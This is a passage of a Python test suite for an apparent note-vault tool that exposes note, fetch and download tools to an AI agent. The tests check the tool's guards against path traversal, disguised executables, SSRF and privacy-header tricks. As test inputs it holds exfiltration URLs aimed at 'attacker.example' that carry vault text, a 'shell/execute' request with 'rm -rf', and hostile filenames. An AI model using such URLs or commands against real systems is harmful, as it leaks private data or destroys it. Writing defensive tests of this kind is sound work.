        result = self.call('search_notes', query='distinctive')
        self.assertEqual(len(result['matches']), 30)
        self.assertTrue(result['truncated'])

    def test_write_note_is_additive_owned_and_does_not_overwrite(self):
        result = self.call('write_note', title='Found music', content='Track title with its source URL.')
        path = self.vault / result['path']
        before = path.read_bytes()
        meta, _body = yakala.read_card(path)
        self.assertEqual(meta['ajan_isi'], self.job['id'])
        self.assertEqual(meta['kaynak_karti'], self.job['card_path'])
        self.assertEqual(meta['visibility'], 'private')
        with self.assertRaises(FileExistsError):
            self.call('write_note', title='Found music', content='Erase the original')
        self.assertEqual(path.read_bytes(), before)

    def test_write_note_rejects_device_names_binary_and_large_content(self):
        for title, content in (('CON', 'x'), ('normal', 'x\0y'), ('normal', 'x' * (200 * 1024 + 1))):
            with self.assertRaises(ValueError):
                self.call('write_note', title=title, content=content)

    def test_download_stages_valid_data_records_hash_and_refuses_overwrite(self):
        self.authorize_links('https://example.com/track.mp3')
        with self.transfer():
            result = self.call('download', url='https://example.com/track.mp3', filename='track.mp3')
            with self.assertRaises(FileExistsError):
                self.call('download', url='https://example.com/track.mp3', filename='track.mp3')
        stored = self.job_folder / 'downloads' / result['staging_path']
        self.assertEqual(result['sha256'], hashlib.sha256(stored.read_bytes()).hexdigest())
        registered = json.loads((self.job_folder / 'download-manifests/track.mp3.json').read_text(encoding='utf-8'))
        self.assertEqual(registered, result)

    def test_download_refuses_executables_names_and_disguised_binary(self):
        self.authorize_links('https://example.com/a')
        with patch.object(yakala, '_agent_public_get') as fetch:
            for name in ('x.exe', 'x.py', '../x.mp3', 'NUL.txt', 'x.mp3:evil', 'x.mp3.cmd'):
                with self.assertRaises(ValueError):
                    self.call('download', url='https://example.com/a', filename=name)
            fetch.assert_not_called()
        with self.transfer(b'MZ malicious executable'):
            with self.assertRaises(ValueError):
                self.call('download', url='https://example.com/a', filename='song.mp3')
        self.assertFalse((self.job_folder / 'downloads/song.mp3').exists())

    def test_complete_records_owned_outputs_and_is_idempotent(self):
        self.authorize_links('https://example.com/a.mp3')
        note = self.call('write_note', title='Result', content='Verified result')
        with self.transfer():
            download = self.call('download', url='https://example.com/a.mp3', filename='song.mp3')
        arguments = {'status': 'completed', 'summary': 'Saved the file.', 'notes': [note['path']], 'downloads': [download]}
        self.assertEqual(self.call('complete', **arguments), self.call('complete', **arguments))
        manifest = json.loads((self.job_folder / 'result.json').read_text(encoding='utf-8'))
        self.assertEqual(manifest['job_id'], self.job['id'])
        self.assertEqual(manifest['notes'], [note['path']])
        self.assertEqual(manifest['downloads'], [download])
        with self.assertRaises(ValueError):
            self.call('complete', status='failed', summary='Changed my mind')
        with self.assertRaises(ValueError):
            self.call('write_note', title='Late mutation', content='no')

    def test_complete_auto_notes_remain_idempotent_after_worker_writes_its_host_result(self):
        note = self.call('write_note', title='Result', content='Agent-produced result.')
        arguments = {'status': 'completed', 'summary': 'Submitted result.'}
        before = self.call('complete', **arguments)
        note_root = (self.vault / note['path']).parent
        (note_root / '__host-result.md').write_text(yakala._dump(
            {'tur': 'yakala-ajan-sonucu', 'ajan_isi': self.job['id'], 'visibility': 'private'},
            '# Trusted worker result'), encoding='utf-8')
        self.assertEqual(self.call('complete', **arguments), before)
        manifest = json.loads((self.job_folder / 'result.json').read_text(encoding='utf-8'))
        self.assertEqual(manifest['notes'], [note['path']])

    def test_complete_refuses_foreign_note_and_forged_download(self):
        self.authorize_links('https://example.com/a.mp3')
        self.note('knowledge/existing.md')
        with self.assertRaises(ValueError):
            self.call('complete', status='completed', summary='result', notes=['knowledge/existing.md'])
        with self.transfer():
            download = self.call('download', url='https://example.com/a.mp3', filename='song.mp3')
        for bad in ({**download, 'sha256': '0' * 64}, {**download, 'staging_path': '../song.mp3'}):
            with self.assertRaises(ValueError):
                self.call('complete', status='completed', summary='result', downloads=[bad])
        self.assertFalse((self.job_folder / 'result.json').exists())

    def test_yaml_privacy_syntax_cannot_be_downgraded_to_an_unknown_plain_scalar(self):
        canary = 'privacy-syntax-canary'
        headers = (
            'sensitivity: GİZLİ',
            'SENSİTİVİTY: secret',
            'sensitivity: !!str secret',
            'sensitivity: &privacy secret',
            r'sensitivity: "\x73ecret"',
            r'"\x72emote_allowed": false',
            'sensitivity:\n  - secret',
            'sensitivity: [secret]',
            'sensitivity: null',
            'title: ordinary\n---extra: valid-yaml-key\nremote_allowed: false',
        )
        for index, front in enumerate(headers):
            path = 'knowledge/syntax-%02d.md' % index
            self.note(path, '---\n' + front + '\n---\n' + canary)
            with self.subTest(header=front), self.assertRaises(ValueError):
                self.call('read_note', path=path)
        self.assertEqual(self.call('search_notes', query=canary)['matches'], [])

    def test_obsidian_list_properties_stay_readable_but_never_carry_a_policy_value(self):
        # Obsidian writes list properties as indented `- item` blocks; most vault notes have them.
        readable = ('tags:\n  - proje\n  - fikir\naliases:\n  - Plan',
                    'tags:\n- proje\nremote_allowed: true')
        for index, front in enumerate(readable):
            path = 'knowledge/liste-%02d.md' % index
            self.note(path, '---\n' + front + '\n---\nlist property text')
            with self.subTest(header=front):
                self.assertIn('list property text', self.call('read_note', path=path)['text'])
        refused = ('tags:\n  - proje\nsensitivity: secret', 'sensitivity:\n  - secret',
                   'sensitivity: internal\n  - secret', 'remote_allowed:\n  - true\n  - false')
        for index, front in enumerate(refused):
            path = 'knowledge/liste-yasak-%02d.md' % index
            self.note(path, '---\n' + front + '\n---\nlist policy canary')
            with self.subTest(header=front), self.assertRaises(ValueError):
                self.call('read_note', path=path)
        self.assertEqual(self.call('search_notes', query='list policy canary')['matches'], [])

    def test_simple_allowed_yaml_and_json_values_keep_working_with_crlf(self):
        headers = (
            'remote_allowed: true\nsensitivity: ordinary # safe',
            '"remote_allowed": "true" # explicit\nsensitivity: "ordinary"',
            "'remote_allowed': 'true'\ntags: [\"one\", \"two\"]",
            '{"remote_allowed": true, "sensitivity": "ordinary"}',
        )
        for index, front in enumerate(headers):
            path = 'knowledge/ordinary-%02d.md' % index
            self.note(path, ('---\n' + front + '\n---\nallowed scalar text').replace('\n', '\r\n'))
            with self.subTest(header=front):
                self.assertIn('allowed scalar text', self.call('read_note', path=path)['text'])

    def test_case_alias_of_attachment_store_still_requires_this_cards_link(self):
        parent = Path(self.job['card_path']).parent
        self.note((parent / yakala.FILES / 'foreign.txt').as_posix(), 'OTHER_CAPTURE_CANARY')
        original = yakala._agent_checked_path

        def case_insensitive_lookup(root, parts, create=False):
            return original(root, [yakala.FILES if part.casefold() == yakala.FILES else part for part in parts],
                            create=create)

        # Exercise the Windows/macOS lookup rule on all hosts; native integration is below.
        with patch.object(yakala, '_agent_checked_path', side_effect=case_insensitive_lookup):
            with self.assertRaises(ValueError):
                self.call('read_note', path=(parent / 'DOSYALAR' / 'foreign.txt').as_posix())

    def test_search_never_walks_case_variants_of_actual_attachment_store(self):
        parent = Path(self.job['card_path']).parent
        self.note((parent / 'DOSYALAR' / 'foreign.md').as_posix(), 'ATTACHMENT_SEARCH_CANARY')
        self.assertEqual(self.call('search_notes', query='ATTACHMENT_SEARCH_CANARY')['matches'], [])

    def test_canonical_long_name_is_checked_after_an_alias_lookup(self):
        self.note('.hidden/ordinary.md', 'HIDDEN_ALIAS_CANARY')
        original = yakala._agent_checked_path

        def short_name_lookup(root, parts, create=False):
            if parts == ['HIDDEN~1', 'ordinary.md']:
                return original(root, ['.hidden', 'ordinary.md'], create=create)
            return original(root, parts, create=create)

        with patch.object(yakala, '_agent_checked_path', side_effect=short_name_lookup):
            with self.assertRaises(ValueError):
                self.call('read_note', path='HIDDEN~1/ordinary.md')

    @unittest.skipUnless(os.name == 'nt' and sys.platform == 'win32', 'Native Windows path aliases')
    def test_native_windows_attachment_case_and_short_hidden_alias(self):
        parent = Path(self.job['card_path']).parent
        self.note((parent / yakala.FILES / 'foreign.txt').as_posix(), 'OTHER_CAPTURE_CANARY')
        with self.assertRaises(ValueError):
            self.call('read_note', path=(parent / 'DOSYALAR' / 'foreign.txt').as_posix())
        hidden = self.note('.hidden-directory/ordinary.md', 'HIDDEN_ALIAS_CANARY').parent
        kernel = C.WinDLL('kernel32', use_last_error=True)
        convert = kernel.GetShortPathNameW
        convert.argtypes = (C.c_wchar_p, C.c_wchar_p, C.c_uint32)
        convert.restype = C.c_uint32
        buffer = C.create_unicode_buffer(32768)
        length = convert(str(hidden), buffer, len(buffer))
        if not length or length >= len(buffer):
            self.skipTest('8.3 short names are unavailable on this filesystem.')
        alias = Path(buffer.value).name
        if alias.startswith('.') or alias.casefold() == hidden.name.casefold():
            self.skipTest('The filesystem did not assign an alternate 8.3 name.')
        with self.assertRaises(ValueError):
            self.call('read_note', path=alias + '/ordinary.md')

    def test_arbitrary_public_url_cannot_transmit_vault_text(self):
        self.note('knowledge/ordinary.md', 'VAULT_CANARY_7291')
        canary = self.call('read_note', path='knowledge/ordinary.md')['text']
        malicious = (
            'https://attacker.example/collect?text=' + canary,
            'https://' + canary.lower() + '.attacker.example/',
            self.job['url'] + '?text=' + canary,
            self.job['url'] + '/' + canary,
        )
        with patch.object(yakala, '_agent_public_get', side_effect=ValueError('Network boundary reached')) as fetched:
            for url in malicious:
                for tool, extra in (('fetch_source', {}), ('download', {'filename': 'payload.txt'})):
                    with self.subTest(url=url, tool=tool), self.assertRaises(ValueError):
                        self.call(tool, url=url, **extra)
            fetched.assert_not_called()

    def test_exact_source_links_can_be_downloaded_but_modifying_them_is_denied(self):
        url = 'https://cdn.example.com/track.mp3?version=1'
        source = self.authorize_links(url)
        self.assertIn(url, source['links'])
        with self.transfer():
            result = self.call('download', url=url, filename='permitted.mp3')
        self.assertEqual(result['source_url'], url)
        with patch.object(yakala, '_agent_public_get', side_effect=ValueError('Network boundary reached')) as fetched:
            for changed in (url + '&private=CANARY', url.replace('version=1', 'version=2'),
                            url.replace('cdn.example.com', 'attacker.example')):
                with self.subTest(url=changed), self.assertRaises(ValueError):
                    self.call('fetch_source', url=changed)
            fetched.assert_not_called()

    def test_successful_complete_revokes_reads_search_and_fetch_immediately(self):
        self.note('knowledge/ordinary.md', 'ordinary')
        result = {'status': 'completed', 'summary': 'Done.'}
        self.call('complete', **result)
        with patch.object(yakala, '_agent_public_get', side_effect=ValueError('Network boundary reached')) as fetched:
            for tool, args in (('read_note', {'path': 'knowledge/ordinary.md'}),
                               ('search_notes', {'query': 'ordinary'}),
                               ('fetch_source', {'url': self.job['url']})):
                with self.subTest(tool=tool), self.assertRaises(ValueError):
                    self.call(tool, **args)
            fetched.assert_not_called()
        self.assertTrue(self.call('complete', **result)['accepted'])

    def test_complete_acknowledges_submission_without_claiming_worker_success(self):
        result = self.call('complete', status='completed', summary='Model considers its work done.')
        self.assertTrue(result['accepted'])
        self.assertEqual(result['status'], 'submitted')
        self.assertEqual(result['requested_status'], 'completed')
        self.assertFalse(result['completion_verified'])
        self.assertEqual(self.job['state'], 'running')

    def test_completion_manifest_is_invisible_until_its_snapshot_is_durable(self):
        target = self.job_folder / 'result.json'
        original = yakala.os.fsync
        snapshots = []

        def inspect_before_commit(descriptor):
            snapshots.append(target.exists())
            return original(descriptor)

        with patch.object(yakala.os, 'fsync', side_effect=inspect_before_commit):
            self.call('complete', status='completed', summary='Durable result.')
        # The first fsync belongs to private staged content. A later directory fsync may see the commit.
        self.assertFalse(snapshots[0])
        self.assertEqual(json.loads(target.read_text(encoding='utf-8'))['summary'], 'Durable result.')
        self.assertEqual(list(self.job_folder.glob('.ajan-new-*')), [])

    def test_failed_atomic_completion_publication_leaves_no_partial_manifest(self):
        target = self.job_folder / 'result.json'
        with patch.object(yakala.os, 'link', side_effect=OSError('filesystem has no atomic create-only link')):
            with self.assertRaises(OSError):
                self.call('complete', status='completed', summary='Must not appear early.')
        self.assertFalse(target.exists())
        self.assertEqual(list(self.job_folder.glob('.ajan-new-*')), [])

    def protocol(self, messages):
        lines = '\n'.join(json.dumps(item) for item in messages) + '\n'
        outgoing = io.StringIO()
        with patch.object(sys, 'stdin', io.StringIO(lines)), patch.object(sys, 'stdout', outgoing):
            code = yakala._agent_mcp_main(self.vault, self.state, self.job['id'])
        return code, [json.loads(line) for line in outgoing.getvalue().splitlines()]

    def handshake(self, version='2025-06-18'):
        return [{'jsonrpc': '2.0', 'id': 1, 'method': 'initialize', 'params': {'protocolVersion': version}},
                {'jsonrpc': '2.0', 'method': 'notifications/initialized'}]

    def test_protocol_initialize_tools_and_ping_are_only_json(self):
        code, rows = self.protocol(self.handshake() + [
            {'jsonrpc': '2.0', 'id': 2, 'method': 'tools/list'},
            {'jsonrpc': '2.0', 'id': 3, 'method': 'ping'},
        ])
        self.assertEqual(code, 0)
        self.assertEqual(len(rows), 3)
        self.assertEqual(rows[0]['result']['protocolVersion'], '2025-06-18')
        names = [tool['name'] for tool in rows[1]['result']['tools']]
        self.assertEqual(names, ['read_note', 'search_notes', 'fetch_source', 'download',
                                 'music_info', 'music_identify', 'write_note', 'complete'])
        self.assertEqual(rows[2]['result'], {})

    def test_protocol_refuses_uninitialized_unknown_method_and_bad_tool(self):
        code, rows = self.protocol([
            {'jsonrpc': '2.0', 'id': 0, 'method': 'tools/list'},
            *self.handshake(),
            {'jsonrpc': '2.0', 'id': 2, 'method': 'shell/execute', 'params': {'command': 'rm -rf'}},
            {'jsonrpc': '2.0', 'id': 3, 'method': 'tools/call', 'params': {'name': []}},
        ])
        self.assertEqual(code, 0)
        self.assertEqual([row.get('error', {}).get('code') for row in rows], [-32002, None, -32601, -32602])

    def test_protocol_tool_error_is_result_and_never_invokes_shell(self):
        with patch.object(yakala.subprocess, 'Popen') as spawned:
            code, rows = self.protocol(self.handshake() + [
                {'jsonrpc': '2.0', 'id': 2, 'method': 'tools/call',
                 'params': {'name': 'read_note', 'arguments': {'path': '../secrets.md'}}},
            ])
        spawned.assert_not_called()
        self.assertEqual(code, 0)
        self.assertTrue(rows[-1]['result']['isError'])

    def test_protocol_oversized_line_closes_without_running_a_tool(self):
        outgoing = io.StringIO()
        with patch.object(sys, 'stdin', io.StringIO('x' * (1024 * 1024 + 1))), patch.object(sys, 'stdout', outgoing), \
                patch.object(yakala, '_agent_tool_call') as call:
            self.assertEqual(yakala._agent_mcp_main(self.vault, self.state, self.job['id']), 1)
        call.assert_not_called()
        self.assertEqual(json.loads(outgoing.getvalue())['error']['code'], -32700)


class FakeAgentResponse:
    def __init__(self, body=b'hello', status=200, headers=None):
        self.body, self.status, self.headers, self.closed = io.BytesIO(body), status, headers or {}, False

    def getheader(self, name, default=None):
        return self.headers.get(name, default)

    def read1(self, limit):
        return self.body.read(limit)

    def close(self):
        self.closed = True


class AgentBridgeNetworkTest(unittest.TestCase):
    def run_get(self, responses, url='https://example.com/page', answers=None, **kwargs):
        sockets, requests, tls_hosts = [], [], []

        class FakeSocket:
            def __init__(self, family, kind):
                self.family, self.kind, self.endpoint, self.closed, self.timeouts = family, kind, None, False, []
                sockets.append(self)

            def settimeout(self, value):
                self.timeouts.append(value)

            def connect(self, endpoint):
                self.endpoint = endpoint

            def close(self):
                self.closed = True

        class FakeHTTP:
            def __init__(self, host, port, timeout):
                self.host, self.port, self.timeout, self.sock = host, port, timeout, None

            def request(self, method, path, headers):
                self.connect()
                requests.append({'method': method, 'path': path, 'headers': headers, 'host': self.host})

            def getresponse(self):
                return responses.pop(0)

            def close(self):
                if self.sock:
                    self.sock.close()

        def tls_wrap(channel, server_hostname):
            tls_hosts.append(server_hostname)
            return channel

        with patch('http.client.HTTPConnection', FakeHTTP), patch('socket.socket', FakeSocket), \
                patch('socket.getaddrinfo', return_value=answers or [(socket.AF_INET, socket.SOCK_STREAM, 6, '', ('93.184.216.34', 443))]), \
                patch('ssl.create_default_context', return_value=types.SimpleNamespace(wrap_socket=tls_wrap)):
            result = yakala._agent_public_get(url, **kwargs)
        return result, sockets, requests, tls_hosts

    def test_socket_is_pinned_and_tls_still_checks_hostname(self):
        response = FakeAgentResponse(headers={'Content-Type': 'text/plain'})
        result, sockets, requests, tls = self.run_get([response])
        self.assertEqual(result['body'], b'hello')
        self.assertEqual(sockets[0].endpoint, ('93.184.216.34', 443))
        self.assertEqual(tls, ['example.com'])
        self.assertEqual(requests[0]['method'], 'GET')
        self.assertNotIn('Authorization', requests[0]['headers'])
        self.assertNotIn('Cookie', requests[0]['headers'])
        self.assertTrue(sockets[0].closed)
        self.assertTrue(response.closed)

    def test_mixed_private_dns_answer_never_connects(self):
        answers = [(socket.AF_INET, socket.SOCK_STREAM, 6, '', ('93.184.216.34', 443)),
                   (socket.AF_INET, socket.SOCK_STREAM, 6, '', ('127.0.0.1', 443))]
        with patch('socket.getaddrinfo', return_value=answers), patch('socket.socket') as channel:
            with self.assertRaises(ValueError):
                yakala._agent_public_get('https://example.com/x')
        channel.assert_not_called()

    def test_private_redirect_and_https_downgrade_are_refused(self):
        for target in ('https://127.0.0.1/private', 'http://example.com/insecure'):
            response = FakeAgentResponse(status=302, headers={'Location': target})
            with self.assertRaises(ValueError):
                self.run_get([response])
            self.assertTrue(response.closed)

    def test_each_public_redirect_uses_fresh_validated_dns(self):
        first = FakeAgentResponse(status=302, headers={'Location': 'https://cdn.example.com/song'})
        final = FakeAgentResponse(body=b'final')
        result, sockets, requests, tls = self.run_get([first, final])
        self.assertEqual(result['url'], 'https://cdn.example.com/song')
        self.assertEqual(tls, ['example.com', 'cdn.example.com'])
        self.assertEqual(len(sockets), 2)
        self.assertTrue(all(item.closed for item in sockets))

    def test_oversized_and_compressed_response_are_refused(self):
        for response in (FakeAgentResponse(body=b'123456'),
                         FakeAgentResponse(headers={'Content-Length': '100'}),
                         FakeAgentResponse(headers={'Content-Encoding': 'gzip'})):
            with self.assertRaises(ValueError):
                self.run_get([response], byte_limit=5)
            self.assertTrue(response.closed)

    def test_fetch_extracts_exact_links_and_discards_script_source(self):
        html = b'<html><title>A song</title><script>delete everything</script><p>Music by A.</p><a href="/song.mp3">Download</a></html>'
        with patch.object(yakala, '_agent_public_get', return_value={'url': 'https://example.com/page', 'body': html,
                                                                  'content_type': 'text/html; charset=utf-8'}):
            result = yakala._agent_fetch_source('https://example.com/page')
        self.assertEqual(result['title'], 'A song')
        self.assertNotIn('delete everything', result['text'])
        self.assertEqual(result['links'], ['https://example.com/song.mp3'])
        self.assertEqual(result['source_trust'], 'untrusted')


# Manual extraction and background ownership must not erase each other.

class AgentManualProcessRaceTest(unittest.TestCase):
    def setUp(self):
        temporary = tempfile.TemporaryDirectory(prefix='yakala-manual-agent-race-')
        self.addCleanup(temporary.cleanup)
        self.vault = Path(temporary.name) / 'Örnek Vault'
        self.state = Path(temporary.name) / 'state'
        self.vault.mkdir()
        result = yakala.capture(self.vault, text='Original source text', why='Initial reason', state=self.state)
        self.card_id, self.card_path = result['id'], self.vault / result['path']
        self.raw_path = self.card_path.parent / '.ham' / (self.card_id + '.md')

    def claim(self):
        meta, body = yakala.read_card(self.card_path)
        meta.update(durum='ajanda', ajan_isi='8ed4d7b8-01bf-49fb-8d5b-b7e1eebc8ac6', ajan_asama='sirada')
        yakala.write_card(self.card_path, meta, body + '\n\n## New reason\nA newer captured request.\n')

    def test_claim_between_target_listing_and_snapshot_is_not_erased(self):
        original_find = yakala.find_card

        def claim_after_listing(vault, card_id, state=None):
            old_snapshot = original_find(vault, card_id, state)
            self.claim()
            return old_snapshot

        with patch.object(yakala, 'find_card', side_effect=claim_after_listing), \
                patch.object(yakala, 'tools', return_value={}), \
                patch.object(yakala, 'extract', return_value=('New extracted text', 'test', None)) as extract:
            result = yakala.process(self.vault, [self.card_id], state=self.state)
        meta, body = yakala.read_card(self.card_path)
        self.assertEqual(meta['durum'], 'ajanda')
        self.assertEqual(meta['ajan_isi'], '8ed4d7b8-01bf-49fb-8d5b-b7e1eebc8ac6')
        self.assertIn('A newer captured request.', body)
        self.assertEqual(result['kartlar'][0]['durum'], 'ajanda')
        extract.assert_not_called()
        self.assertFalse(self.raw_path.exists())

    def test_claim_during_extraction_keeps_both_card_and_existing_raw_source(self):
        self.raw_path.parent.mkdir(parents=True)
        original_raw = b'Existing source already available to the newly claimed background job.\n'
        self.raw_path.write_bytes(original_raw)

        def claim_during_extract(*args, **kwargs):
            self.claim()
            return 'A late extraction that may no longer commit', 'test', None

        with patch.object(yakala, 'tools', return_value={}), \
                patch.object(yakala, 'extract', side_effect=claim_during_extract):
            result = yakala.process(self.vault, [self.card_id], state=self.state)
        meta, body = yakala.read_card(self.card_path)
        self.assertEqual(meta['durum'], 'ajanda')
        self.assertEqual(meta['ajan_isi'], '8ed4d7b8-01bf-49fb-8d5b-b7e1eebc8ac6')
        self.assertIn('A newer captured request.', body)
        self.assertEqual(self.raw_path.read_bytes(), original_raw)
        self.assertEqual(result['kartlar'][0]['durum'], 'hata')
        self.assertIn('degisti', result['kartlar'][0]['not'])

    def test_unchanged_source_still_commits_raw_text_and_card(self):
        with patch.object(yakala, 'tools', return_value={}), \
                patch.object(yakala, 'extract', return_value=('Expected extracted source', 'test', None)):
            result = yakala.process(self.vault, [self.card_id], state=self.state)
        meta, _body = yakala.read_card(self.card_path)
        self.assertEqual(meta['durum'], 'cikarildi')
        self.assertEqual(result['kartlar'][0]['durum'], 'cikarildi')
        self.assertIn('Expected extracted source', self.raw_path.read_text(encoding='utf-8'))


if __name__ == '__main__':
    unittest.main()
